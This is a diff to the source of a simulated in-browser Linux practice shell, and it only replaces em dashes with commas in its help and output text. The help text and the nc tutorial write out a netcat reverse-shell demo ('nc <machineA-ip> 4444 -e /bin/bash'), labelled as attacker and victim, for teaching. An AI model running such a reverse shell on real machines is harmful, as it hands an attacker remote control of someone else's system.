@@ -21,7 +21,7 @@ const MAX_OUTPUT = 200_000;
 const MAX_LOOP = 200_000;
 const DEFAULT_TIMEOUT_MS = 5_000;
 
-const SHELL_HELP = `A practice shell — runs safely in your browser, never a real machine.
+const SHELL_HELP = `A practice shell, runs safely in your browser, never a real machine.
 
   Navigate : ls  cd  pwd  tree  find  stat  file  realpath
   Files    : cat  cp  mv  rm  mkdir  rmdir  touch  ln  chmod  chown  du
@@ -41,7 +41,7 @@ Try:  ls -la      ·   cat readme.md      ·   grep -i error /var/log/syslog
       nmap 10.0.0.5      ·   ping -c 3 google.com      ·   sudo apt update
       chmod +x scripts/hello.sh && ./scripts/hello.sh
 
-Reverse-shell demo — click Split in the header for two terminals (A on top, B below):
+Reverse-shell demo, click Split in the header for two terminals (A on top, B below):
       Machine A:  nc -lvnp 4444        Machine B:  nc <machineA-ip> 4444 -e /bin/bash
   * full-screen editors (nano/vi) show a redirection tip instead.
 `;
@@ -734,10 +734,10 @@ function aptRun(args: string[], io: IO): number {
       return 0;
     }
     case 'search':
-      w('nmap/stable 7.94 amd64\n  the Network Mapper — a security scanner\nnetcat-traditional/stable 1.10 amd64\n  TCP/IP swiss army knife\n');
+      w('nmap/stable 7.94 amd64\n  the Network Mapper, a security scanner\nnetcat-traditional/stable 1.10 amd64\n  TCP/IP swiss army knife\n');
       return 0;
     case 'show':
-      w(`Package: ${pkgs[0] ?? 'nmap'}\nVersion: 7.94\nSection: net\nMaintainer: CyberKhana Labs\nDescription: ${pkgs[0] ?? 'nmap'} — installed in the practice sandbox\n`);
+      w(`Package: ${pkgs[0] ?? 'nmap'}\nVersion: 7.94\nSection: net\nMaintainer: CyberKhana Labs\nDescription: ${pkgs[0] ?? 'nmap'}, installed in the practice sandbox\n`);
       return 0;
     case 'list':
       w([...ctx.packages].sort().map((p) => `${p}/stable,now 1.0 amd64 [installed]`).join('\n') + (ctx.packages.size ? '\n' : 'Listing... Done\n'));
@@ -787,7 +787,7 @@ function ncRun(args: string[], io: IO): number {
       'Click Split in the header, then across the two panes:\n' +
       '  Machine A (attacker):  nc -lvnp 4444\n' +
       '  Machine B (victim):    nc <machineA-ip> 4444 -e /bin/bash\n' +
-      "  Then type commands in A — you're driving B's shell.\n");
+      "  Then type commands in A, you're driving B's shell.\n");
     return 0;
   }
   const flags = args.filter((a) => a.startsWith('-') && !/^-\d+$/.test(a));
@@ -1719,7 +1719,7 @@ const BUILTINS: Record<string, (args: string[], io: IO) => number> = {
   disown() { return 0; },
   top(_args, { w, ctx }) {
     const u = ctx.user ?? 'user';
-    w(`top - ${new Date().toTimeString().slice(0, 8)} up 2 days,  3:14,  1 user,  load average: 0.08, 0.03, 0.01\nTasks:  42 total,   1 running,  41 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  1.3 us,  0.7 sy,  0.0 ni, 97.7 id,  0.3 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   2000.0 total,   1000.0 free,    512.0 used,    488.0 buff/cache\nMiB Swap:   1024.0 total,   1024.0 free,      0.0 used.   1400.0 avail Mem\n\n    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n   1000 root      20   0   15232   9216   7168 S   0.3   0.5   0:02.13 sshd\n   1502 ${u.padEnd(9)}20   0  132000  22000  12000 S   0.7   1.1   0:05.44 nginx\n   1337 ${u.padEnd(9)}20   0   12000   5000   3200 S   0.0   0.2   0:00.42 bash\n\n[i] Interactive top isn't available in the sandbox — this is a one-time snapshot.\n`);
+    w(`top - ${new Date().toTimeString().slice(0, 8)} up 2 days,  3:14,  1 user,  load average: 0.08, 0.03, 0.01\nTasks:  42 total,   1 running,  41 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  1.3 us,  0.7 sy,  0.0 ni, 97.7 id,  0.3 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   2000.0 total,   1000.0 free,    512.0 used,    488.0 buff/cache\nMiB Swap:   1024.0 total,   1024.0 free,      0.0 used.   1400.0 avail Mem\n\n    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n   1000 root      20   0   15232   9216   7168 S   0.3   0.5   0:02.13 sshd\n   1502 ${u.padEnd(9)}20   0  132000  22000  12000 S   0.7   1.1   0:05.44 nginx\n   1337 ${u.padEnd(9)}20   0   12000   5000   3200 S   0.0   0.2   0:00.42 bash\n\n[i] Interactive top isn't available in the sandbox, this is a one-time snapshot.\n`);
     return 0;
   },
   htop(args, io) { return BUILTINS.top(args, io); },
@@ -1753,8 +1753,8 @@ const BUILTINS: Record<string, (args: string[], io: IO) => number> = {
   vim(args, { w }) { w(editorNote('vim', args)); return 0; },
   nvim(args, { w }) { w(editorNote('nvim', args)); return 0; },
   emacs(args, { w }) { w(editorNote('emacs', args)); return 0; },
-  reboot(_args, { w }) { w('[i] Reboot is disabled in the sandbox — nothing to restart here.\n'); return 0; },
-  shutdown(_args, { w }) { w('[i] Shutdown is disabled in the sandbox — this shell keeps running.\n'); return 0; },
+  reboot(_args, { w }) { w('[i] Reboot is disabled in the sandbox, nothing to restart here.\n'); return 0; },
+  shutdown(_args, { w }) { w('[i] Shutdown is disabled in the sandbox, this shell keeps running.\n'); return 0; },
   poweroff(_args, { w }) { w('[i] Power-off is disabled in the sandbox.\n'); return 0; },
   zsh(_args, { w }) { w('[i] This sandbox runs bash. zsh shares the same basics covered in the course.\n'); return 0; },
 
@@ -1853,7 +1853,7 @@ function seedSession(user: string): { fs: FSDir; env: Record<string, string>; cw
   F('/etc/passwd',
     `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n${user}:x:1000:1000:${user}:/home/${user}:/bin/bash\n`);
   F('/etc/shadow', 'root:!:19000:0:99999:7:::\n', 'r--------');
-  F('/etc/motd', 'Welcome to CyberKhana Linux — a safe practice sandbox.\n');
+  F('/etc/motd', 'Welcome to CyberKhana Linux, a safe practice sandbox.\n');
   F('/etc/resolv.conf', 'nameserver 10.0.0.1\nnameserver 1.1.1.1\nsearch cyberkhana.local\n');
   F('/etc/apt/sources.list', 'deb http://deb.cyberkhana.local stable main contrib\ndeb http://security.cyberkhana.local stable-security main\n');
   F('/etc/crontab', '# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n0  2    * * *   root    /usr/local/sbin/backup.sh\n');
@@ -1874,11 +1874,11 @@ function seedSession(user: string): { fs: FSDir; env: Record<string, string>; cw
   // Home files
   F(`${home}/welcome.txt`,
     `Welcome to your CyberKhana practice shell, ${user}!\n\n` +
-    `This is a safe, in-browser Linux sandbox — explore freely.\n` +
+    `This is a safe, in-browser Linux sandbox, explore freely.\n` +
     `Try:   ls -la      cat readme.md      cd projects      tree      help\n`);
   F(`${home}/readme.md`,
     `# ${user}'s sandbox\n\nA place to practice Linux commands. Nothing here can affect a real machine.\n\n` +
-    `## Folders\n- Documents/  — text files and notes\n- Downloads/  — a sample file or two\n- projects/   — a tiny web app\n- scripts/    — example shell scripts\n`);
+    `## Folders\n- Documents/ , text files and notes\n- Downloads/ , a sample file or two\n- projects/  , a tiny web app\n- scripts/   , example shell scripts\n`);
   F(`${home}/.bashrc`, "export PS1='\\u@\\h:\\w\\$ '\nalias ll='ls -la'\nalias ..='cd ..'\n");
   F(`${home}/.bash_history`, 'ls -la\ncd projects\ncat readme.md\ngrep -i error /var/log/syslog\nwhoami\n');
   F(`${home}/todo.txt`, '[ ] learn ls, cd, pwd\n[ ] practice grep and pipes\n[ ] write a bash script\n[x] open the terminal\n');
@@ -1890,7 +1890,7 @@ function seedSession(user: string): { fs: FSDir; env: Record<string, string>; cw
   F(`${home}/Downloads/numbers.txt`, '42\n7\n15\n3\n99\n23\n8\n');
   F(`${home}/projects/webapp/index.html`, '<!doctype html>\n<html><head><title>webapp</title></head><body>hello</body></html>\n');
   F(`${home}/projects/webapp/app.js`, "console.log('starting webapp');\nconst port = 3000;\nconsole.log('listening on ' + port);\n");
-  F(`${home}/projects/README`, 'webapp — a demo project. run: node app.js\n');
+  F(`${home}/projects/README`, 'webapp, a demo project. run: node app.js\n');
   F(`${home}/scripts/hello.sh`, '#!/bin/bash\necho "Hello from a script!"\nfor i in 1 2 3; do\n  echo "count $i"\ndone\n', 'rwxr-xr-x');
   F(`${home}/scripts/backup.sh`, '#!/bin/bash\n# pretend to back up the home folder\necho "backing up $HOME ..."\necho "done"\n', 'rwxr-xr-x');
 
